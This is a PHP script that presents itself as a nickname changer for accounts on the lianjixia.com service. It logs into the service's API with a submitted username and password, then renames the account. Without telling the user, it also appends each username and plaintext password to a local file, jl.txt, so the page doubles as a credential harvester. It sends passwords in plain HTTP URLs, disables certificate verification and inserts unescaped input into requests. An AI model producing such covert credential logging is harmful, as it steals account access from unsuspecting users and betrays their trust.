<meta charset="utf-8">
<?php
date_default_timezone_set("PRC");
error_reporting(E_ALL ^ E_NOTICE);// 显示除去 E_NOTICE 之外的所有错误信息
$username = $_POST['username'];
$password = $_POST['password'];
$nick = $_POST['nick'];


if ($username != "" &&($password !="" && $password!= "")) {
	# code...
	sleep(3);
	$file_contents = curl_get_https("http://api.lianjixia.com/user_api/?&do=login&name=".$username."&pwd=".$password."&sign=75381b6111964679a22e16cf10132667&version=0.3.32");
	$session_id = getSubstr($file_contents,'"session_id":',',
	"stamp"');
	sleep(3);
	// http://api.lianjixia.com/user_api/?&do=modify_current_user_nick&nick=修改的名字&session_id=上面获取的session&sign=1709fe6308044566a22474dfd7939f02&version=0.3.32
	if ($session_id != "") {
		# code...
		curl_get_https("http://api.lianjixia.com/user_api/?&do=modify_current_user_nick&nick=".$nick."&session_id=".$session_id."&sign=1709fe6308044566a22474dfd7939f02&version=0.3.32");
	echo "执行完毕！";
	$file = fopen("jl.txt", "a+");
	fwrite($file,date("Y/m/d")."  ".$username."   ".$password."\n");
	}else{
		echo "执行失败！";
	}
	
}

function getSubstr($str, $leftStr, $rightStr)
{
    $left = strpos($str, $leftStr);
    //echo '左边:'.$left;
    $right = strpos($str, $rightStr,$left);
    //echo '<br>右边:'.$right;
    if($left < 0 or $right < $left) return '';
    return substr($str, $left + strlen($leftStr), $right-$left-strlen($leftStr));
}

function curl_get_https($url){
    $curl = curl_init(); // 启动一个CURL会话
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);// TRUE 将curl_exec()获取的信息以字符串返回，而不是直接输出。
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); // 跳过证书检查
    $tmpInfo = curl_exec($curl); // 返回api的json对象
    curl_close($curl);
    return $tmpInfo; // 返回json对象
}
?>